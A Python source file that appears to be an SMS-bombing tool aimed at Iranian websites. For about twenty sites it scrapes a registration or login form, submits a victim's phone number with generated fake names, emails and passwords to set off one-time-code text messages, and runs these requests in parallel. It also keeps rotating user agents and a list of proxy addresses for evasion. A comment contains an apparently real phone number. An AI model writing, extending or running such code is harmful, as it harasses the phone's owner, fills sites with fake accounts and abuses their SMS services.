from concurrent.futures import ThreadPoolExecutor, as_completed
from utils import print_error, print_success
from urllib.parse import urlparse, urljoin
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from bs4 import BeautifulSoup
import requests
import random
import uuid
import time
import re
import json

from utils import print_error, print_success


class Base:
    def __init__(self, phone):
        # Initialize with phone number, session, headers, and user agents
        self.phone = phone

        self.user_agents = [
            # Windows Chrome
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/121.0.0.0 Safari/537.36",
            # Mac Safari
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) "
            "AppleWebKit/605.1.15 (KHTML, like Gecko) "
            "Version/17.1 Safari/605.1.15",
            # Ubuntu Firefox
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) "
            "Gecko/20100101 Firefox/121.0",
            # Android Chrome
            "Mozilla/5.0 (Linux; Android 12; Samsung Galaxy S21) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/121.0.0.0 Mobile Safari/537.36",
            # iPhone Safari
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) "
            "AppleWebKit/605.1.15 (KHTML, like Gecko) "
            "Version/17.0 Mobile/15E148 Safari/604.1",
            # iPad Safari
            "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) "
            "AppleWebKit/605.1.15 (KHTML, like Gecko) "
            "Version/17.0 Mobile/15E148 Safari/604.1",
            # Windows Edge
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
        ]

        self.proxies_list = [
            "http://115.114.77.133:9090",
            "http://96.30.116.11:8293",
            "http://179.96.28.58:80",
            "http://14.241.80.37:8080",
            "http://200.174.198.32:8888",
            "http://141.147.9.254:80",
            "http://5.161.103.41:88",
            "http://72.10.160.91:9537",
            "http://213.142.156.97:80",
        ]

        self.session = requests.Session()
        self.headers = {
            "User-Agent": random.choice(self.user_agents),
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "X-Requested-With": "XMLHttpRequest",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        }

        # Pick random proxy
        # proxy = random.choice(self.proxies_list)
        # self.session.proxies.update({
        #     "http": proxy,
        #     "https": proxy,
        # })

        # Call configure session here
        # self._configure_session()

    def _configure_session(self):
        # Configure retries for transient errors
        retry = Retry(
            total=3,
            backoff_factor=0.5,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["GET", "POST"],
        )
        adapter = HTTPAdapter(max_retries=retry)
        self.session.mount("https://", adapter)
        self.session.mount("http://", adapter)
        self.session.headers.update(self.headers)

    def phone_with_98(self, phone, plus=False):
        code = '+98' if plus else '98'
        phone = code + phone[1:]
        return phone

    def split_number_with_plus(self, number_str: str) -> str:
        # Split phone number into three parts with '+' separators
        number_str = number_str.replace("09", "9")
        part1 = number_str[0:3]
        part2 = number_str[3:6]
        part3 = number_str[6:]
        return f"{part1}+{part2}+{part3}"

    def post(self, url, data=None, save=False, headers=None, result=False):
        try:
            site = urlparse(url).netloc

            # Use default headers if none provided
            if headers is None:
                headers = self.headers

            # Send POST request with session (cookies preserved)
            r = self.session.post(url, data=data, headers=headers)

            if r.ok:
                print_success(f"SMS request successfully sent to {site}")
                if result:
                    return r.text
            else:
                print_error(
                    f"Request to {site} failed with status code {r.status_code}"
                )

            if save:
                self.save(r.text)

        except Exception as e:
            print_error(f"Failed to send data to {url}: {e}")

    def save(self, data):
        # Save response HTML to temp.html for debugging
        with open("temp.html", mode="w", encoding="utf-8") as file:
            file.write(data)

    def generate_strong_password(self, length=10):
        # Generate a random strong password using UUID
        return uuid.uuid4().hex[0:length]

    def unique_username(self, prefix="user"):
        # Generate unique username using prefix + timestamp + random number
        return f"{prefix}_{int(time.time())}_{random.randint(1000,9999)}"

    def unique_email(self, domain="example.com"):
        # Generate unique email using random UUID string
        local_part = uuid.uuid4().hex[:10]
        return f"{local_part}@{domain}"

    def set_input_to_data(self, inputs):
        # Convert HTML input fields into a dictionary
        data = {}
        for inp in inputs:
            name = inp.get("name")
            value = inp.get("value", "")
            if name:
                data[name] = value
        return data

    def get(self, url):
        try:
            # Send GET request and parse HTML with BeautifulSoup
            header = self.update_header({"Referer": url})
            response = self.session.get(url, headers=header)
            response.raise_for_status()
            soup = BeautifulSoup(response.content, "html.parser")
        except Exception as e:
            parsed = urlparse(url)
            print_error(f"Error fetching {parsed.netloc}: {e}")
            return None
        else:
            return soup

    def update_header(self, new_header):
        h = self.headers.copy()
        h.update(new_header)
        return h


class Register(Base):
    def varzesh3(self):
        url = "https://sso.varzesh3.com/account/login?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Df50167918abe48e8b116d8169a14aa29%26redirect_uri%3Dhttps%253A%252F%252Fvideo.varzesh3.com%252Foidc%252Fcallback%26response_type%3Dcode%26scope%3Dopenid%2520profile%2520offline_access%2520videos.api%2520comments.api%2520profile.api%2520world-cup.prediction.api%2520engagement.api%2520notification.api%2520pishbini.api%26state%3D76508f8f247645e6bbc7dba0779a6d93%26code_challenge%3DemsZsfVqHuVqwQMsNA3I6XgaSmeh5UcoBTuN8Q9pCUw%26code_challenge_method%3DS256"
        soup = self.get(url)
        if not soup:
            return

        form = soup.find("form")
        inputs = form.find_all("input")

        data = self.set_input_to_data(inputs)

        data["PhoneNumber"] = self.phone.replace('09', '9')
        data['button'] = 'login'
        data['Username'] = '98' + self.phone.replace('09', '9')
        
        url = "https://sso.varzesh3.com/account/login?ReturnUrl=/connect/authorize/callback?client_id=f50167918abe48e8b116d8169a14aa29&redirect_uri=https%3A%2F%2Fvideo.varzesh3.com%2Foidc%2Fcallback&response_type=code&scope=openid%20profile%20offline_access%20videos.api%20comments.api%20profile.api%20world-cup.prediction.api%20engagement.api%20notification.api%20pishbini.api&state=76508f8f247645e6bbc7dba0779a6d93&code_challenge=emsZsfVqHuVqwQMsNA3I6XgaSmeh5UcoBTuN8Q9pCUw&code_challenge_method=S256"
        self.post(url, data)
        
    def abzarwp(self):
        url = "https://abzarwp.com/wp-login.php?action=register"
        soup = self.get(url)
        if not soup:
            return

        form = soup.find("form", attrs={"id": "verificationform"})
        inputs = form.find_all("input")

        data = self.set_input_to_data(inputs)

        data["mobile"] = self.phone
        data["formid"] = "registerform"
        data["eferer"] = "/wp-login.php?action=register"

        url = "https://abzarwp.com/wp-admin/admin-ajax.php"
        self.post(url, data)

    def sabzlearn(self):
        url = "https://sabzlearn.ir/signup/"
        soup = self.get(url)
        if not soup:
            return

        form = soup.find("form")
        inputs = form.find_all("input")

        data = self.set_input_to_data(inputs)

        data["username"] = self.unique_username()
        data["email"] = self.unique_email()
        data["pass"] = self.generate_strong_password()
        # data["password"] = self.generate_strong_password()
        data["phone"] = self.phone
        data["action"] = "sthe_signup_otp"

        url = "https://sabzlearn.ir/wp-admin/admin-ajax.php"

        # POST	https://stats.g.doubleclick.net/g/collect?v=2&tid=G-VEL7T8MDRH&cid=1221159400.1763999553&gtm=45je5bi1v9132128983z89177179203za200zd9132128983&aip=1&dma=0&gcd=13l3l3l3l1l1&npa=0&frm=0&tag_exp=103116026~103200004~104527907~104528500~104684208~104684211~115583767~115938465~115938468~116184927~116184929~116217636~116217638~116474638

        self.post(url, data)

    def learnfiles(self):
        url = "https://learnfiles.com/my-account/"
        soup = self.get(url)
        if not soup:
            return

        form = soup.find("form", attrs={"id": "dotline-register-form"})
        inputs = form.find_all("input")

        data = self.set_input_to_data(inputs)

        data["first_name"] = self.unique_username()
        data["last_name"] = self.unique_username()
        data["email"] = self.unique_email()
        data["password"] = self.generate_strong_password()
        data["mobile"] = self.phone
        data["action"] = "dotline_ajax_register"
        data["privacy"] = "1"
        data["token"] = ""
        data["security"] = data.get("dotline-register-security", "")

        url = "https://learnfiles.com/wp-admin/admin-ajax.php"

        self.post(url, data)

    def cafeamuzesh(self):
        url = "https://cafeamuzesh.com/sigin/"
        soup = self.get(url)
        if not soup:
            return

        form = soup.find("form", attrs={"id": "ums-register-form"})
        inputs = form.find_all("input")

        data = self.set_input_to_data(inputs)

        data["mobile_user"] = self.phone
        data["user_email"] = self.unique_email()
        data["term"] = "ok"

        url = "https://cafeamuzesh.com/?ums-ajax=ums_register_form"

        self.post(url, data)

    def vidomart(self):
        def find_nonce_key():
            text = str(soup.find("script", attrs={"id": "master-script-js-before"}))
            if text:
                match = re.search(r'ajaxnonce:\s*"([a-zA-Z0-9]+)"', text)
                if match:
                    nonce_value = match.group(1)
                    return nonce_value
            return ""

        
        url = "https://www.vidomart.shop/login/"
        soup = self.get(url)
        if not soup:
            return

        form = soup.find("div", attrs={"class": "register-form"})
        inputs = form.find_all("input")

        data = self.set_input_to_data(inputs)

        data["mobile"] = self.phone
        data["password"] = self.generate_strong_password()
        data["email"] = self.unique_email()
        data["name"] = self.unique_username()
        data["family"] = self.unique_username()
        data["userType"] = "requester"
        data["nonce_key"] = find_nonce_key()
        data["action"] = "register_with_ajax"

        url = "https://www.vidomart.shop/wp-admin/admin-ajax.php"

        self.post(url, data)

    def rcs(self):
        url = "https://learn.rcs.ir/login"
        soup = self.get(url)
        if not soup:
            return

        form = soup.find("form")
        inputs = form.find_all("input")

        data = self.set_input_to_data(inputs)

        data["form[username]"] = self.phone
        url = urljoin(url, form.get("action"))

        self.post(url, data)

    def digistyle(self):
        url = "https://www.digistyle.com/users/login-register/"
        soup = self.get(url)
        if not soup:
            return

        form = soup.find("form")
        inputs = form.find_all("input")

        data = self.set_input_to_data(inputs)

        data["loginRegister[email_phone]"] = self.phone

        self.post(url, data)
    
    def hermeslearn(self):
        url = "https://hermeslearn.com/portal/"
        soup = self.get(url)
        if not soup:
            return

        form = soup.find("form")
        inputs = form.find_all("input")

        data = self.set_input_to_data(inputs)

        data["username"] = self.phone

        self.post(url, data)
    
    def mohammadfarshadian(self):
        url = "https://mohammadfarshadian.com/"
        soup = self.get(url)
        if not soup:
            return

        form = soup.find("form", attrs={"class": "digits_register"})
        inputs = form.find_all("input")

        data = self.set_input_to_data(inputs)

        email = self.unique_email()
        data["action"] = "digits_check_mob"
        data["countrycode"] = "+98"
        data["mobileNo"] = self.split_number_with_plus(self.phone)
        data["csrf"] = form.find("input", attrs={"name": "dig_nounce"}).get(
            "value", ""
        )
        data["login"] = 2
        data["username"] = ""
        data["email"] = email
        data["dig_nounce"] = email.split("@")[0]
        data["mobmail2"] = email
        data["dig_reg_mail"] = email
        data["captcha_ses"] = ""
        data["captcha"] = ""
        data["digits"] = 1
        data["whatsapp"] = 0
        data["json"] = 1
        data["digits_reg_mail"] = self.split_number_with_plus(self.phone)
        data["digits_reg_password"] = self.generate_strong_password()

        url = "https://mohammadfarshadian.com/wp-admin/admin-ajax.php"
        self.post(url, data)

    def irankargah(self):
        url = "https://irankargah.com/"
        soup = self.get(url)
        if not soup:
            return

        form = soup.find("form", attrs={"class": "register"})
        inputs = form.find_all("input")

        data = self.set_input_to_data(inputs)

        data["phone"] = self.phone.replace("09", "9")
        data["digits_reg_name"] = self.unique_username()
        data["digits_reg_lastname"] = self.unique_username()
        data["email"] = self.unique_email()
        data["sms_otp"] = ''
        data["otp_step_1"] = '1'
        data["digits_otp_field"] = '1'
        data["container"] = 'digits_protected'
        data["sub_action"] = 'sms_otp'
        
        url = "https://irankargah.com/wp-admin/admin-ajax.php"

        self.post(url, data)

    def digikala(self):
        url = "https://auth.digikala.com/realms/dk-group/protocol/openid-connect/auth?client_id=digikala-web-public&redirect_uri=https%3A%2F%2Fwww.digikala.com%2Fsso-redirect%2F%3Fback-url%3D%252F&state=0666420c-cb2e-4b34-8dc1-2797a4a9cff9&response_mode=fragment&response_type=code&scope=openid&nonce=737d5cc2-937c-471d-8f20-5e8f13acc556&code_challenge=737iVEmwecxNDo7sNAYxLbvvH7NFt3GHWeXvYRiATAs&code_challenge_method=S256"
        soup = self.get(url)
        if not soup:
            return

        form = soup.find("form")
        destonation = form.get("action")
        inputs = form.find_all("input")

        data = self.set_input_to_data(inputs)
        data["username"] = self.phone

        self.post(destonation, data)

    def startabad(self):
        url = "https://startabad.com/student-panel/?action=register"
        soup = self.get(url)
        if not soup:
            return
        form = soup.find("form", attrs={"class": "register"})
        inputs = form.find_all("input")

        data = self.set_input_to_data(inputs)

        data["email"] = self.unique_email()
        data["phone"] = self.phone.replace("09", "9")
        data["digits_reg_lastname"] = self.unique_username()
        data["digits_reg_name"] = self.unique_username()
        data["digits_reg_password"] = self.generate_strong_password()
        data["sms_otp"] = ''
        data["otp_step_1"] = '1'
        data["digits_otp_field"] = '1'
        data["dig_otp"] = 'otp'
        data["container"] = 'digits_protected'
        data["sub_action"] = 'sms_otp'
        
        url = "https://startabad.com/wp-admin/admin-ajax.php"

        header = self.update_header(
            {
                "Origin": "https://startabad.com",
                "Referer": "https://startabad.com/?login=true&redirect_to=https%3A%2F%2Fstartabad.com%2Fstudent-panel%2F%3Faction%3Dregister&page=2",
            }
        )

        self.post(url, data, headers=header)
   
    def baziplanet(self):
        # url = "https://baziplanet.com/login?back=my-account"
        # soup = self.get(url)
        # if not soup:
        #     return

        # form = soup.find("form", attr={'id': 'psy-cutomer-form'})
        # inputs = form.find_all("input")

        url = 'https://baziplanet.com/login?back=my-account'
        # data = self.set_input_to_data(inputs)
        data = {}

        data["username"] = self.phone
        data["firstname"] = self.unique_username()
        data["lastname"] = self.unique_username()
        data["password"] = self.generate_strong_password()
        data["action"] = 'register'
        data["ajax"] = '1'
        data["id_customer"] = ''
        data['back'] = {
            0: '',
            1: 'my-account'
        }
        
        self.post(url, data)
 
    def khonyagar(self):
        url = "https://khonyagar.com/"
        # soup = self.get(url)
        # if not soup:
        #     return

        # form = soup.find("form")
        # inputs = form.find_all("input")

        # data = self.set_input_to_data(inputs)
        data = {}
        url = 'https://accounts.khonyagar.com/api/v1/auth/request/'
        
        header = self.update_header(
            {'Referer': 'https://khonyagar.com/'}
        )
        
        data["cellphone"] = self.phone_with_98(self.phone, plus=True)
        
        result = self.post(url, data, headers=header, result=True)
        
        token = json.loads(result).get('temp_token', None)
        new_url = f'https://accounts.khonyagar.com/api/v1/auth/request/{token}/request-sms/'
        self.post(new_url)
        
        
 
    
    def yoosefhooseinoghli(self):
        url = "https://yoosefhooseinoghli.ir/?login=true&redirect_to=https%3A%2F%2Fyoosefhooseinoghli.ir%2Fmy-account%2F&page=1"
        soup = self.get(url)
        if not soup:
            return

        form = soup.find("form", attrs={'class': 'digits_register'})
        inputs = form.find_all("input")
        
        header = self.update_header(
            {
                "Origin": "https://yoosefhooseinoghli.ir",
                "Referer": "https://yoosefhooseinoghli.ir/?login=true&redirect_to=https%3A%2F%2Fyoosefhooseinoghli.ir%2Fmy-account%2F&page=1",
            }
        )
        url = 'https://yoosefhooseinoghli.ir/wp-admin/admin-ajax.php'
        data = self.set_input_to_data(inputs)
        
        data["phone"] = self.split_number_with_plus(self.phone)
        data["email"] = self.unique_email()
        data["digits_reg_name"] = self.unique_username()
        data["digits_reg_username"] = self.unique_username()
        data['digits_reg_password'] = self.generate_strong_password()
        data['dig_otp'] = ''
        data['digt_countrycode'] = '+98'
        
        self.post(url, data, headers=header)
        
        data['dig_otp'] = 'otp'
        data['sms_otp'] = ''
        data['otp_step_1'] = '1'
        data['digits_otp_field'] = '1'
        data['container'] = 'digits_protected'
        data['sub_action'] = 'sms_otp'
        
        self.post(url, data, headers=header)
            
    def numberland(self):
        url = "https://numberland.ir/"
        soup = self.get(url)
        if not soup:
            return

        form = soup.find('form', id='checkfornewentertosite')
        
        inputs = form.find_all("input")

        data = self.set_input_to_data(inputs)

        data["user"] = self.phone
        data["safeme"] = "1"

        url = 'https://numberland.ir/ajax_login.php'
        print(data)
        
        # vaziatload	"checkfornewentertosite"
        # enterbyusepass	"1"
        # XCSRFTOKEN	"b5e7cdfcdd31695ed129d5b528b112726bf61c383143aa08b5acbbdfe5b87e154d76932a"
        # user	"09218557979"
        # safeme	"1"
        self.post(url, data)
 
    def chebazi(self):
        url = "https://chebazi.ircg.ir/account/login"
        soup = self.get(url)
        if not soup:
            return

        form = soup.find("form")
        inputs = form.find_all("input")

        url = 'https://chebazi.ircg.ir/account/login'
        data = self.set_input_to_data(inputs)

        data["Mobile"] = self.phone
        data.pop('ByPass', None)
        data.pop('ByCode', None)
        data.pop('SendCodeAgain', None)
        data["X-Requested-With"] = 'XMLHttpRequest'
        
        self.post(url, data)
        
        data["step"] = '4'
        data['Password'] = self.generate_strong_password()
        
        self.post(url, data)
  
    def start(self):
        methods = [
            # self.sabzlearn,
            # self.abzarwp,
            # self.learnfiles,
            # self.vidomart,
            # self.cafeamuzesh,
            # self.digistyle,
            # self.mohammadfarshadian,
            # self.rcs,
            # self.hermeslearn,
            # self.irankargah,
            # self.digikala,
            # self.startabad,
            # self.baziplanet,
            # self.varzesh3,
            # self.khonyagar,
            
            # change neaded
            # self.numberland,
            # self.yoosefhooseinoghli,
            # self.tatami,
            
            # test one more time
            # self.chebazi,
            
            
        ]
        with ThreadPoolExecutor(max_workers=3) as executor:
            future_to_method = {executor.submit(method): method.__name__ for method in methods}

            for future in as_completed(future_to_method):
                method_name = future_to_method[future]
                try:
                    future.result()
                except Exception as e:
                    print_error(f"{method_name} failed: {e}")